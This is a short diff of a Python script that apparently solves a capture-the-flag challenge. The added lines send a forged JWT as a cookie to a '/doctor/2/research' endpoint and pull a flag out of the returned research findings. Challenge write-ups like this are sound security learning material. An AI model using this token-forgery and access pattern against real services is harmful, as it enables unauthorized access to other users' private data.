@@ -88,4 +88,10 @@ encoded_signature = encode(str(signature))
 
 token = f"{encoded_header}.{encoded_payload}.{encoded_signature}"
 
-print(token)
+response = requests.get(f"{BASE_URL}/doctor/2/research", cookies = { "token": token }).content
+
+response = json.loads(response)
+
+flag = response["research_data"]["findings"].split("\n")[-2]
+
+print(flag)
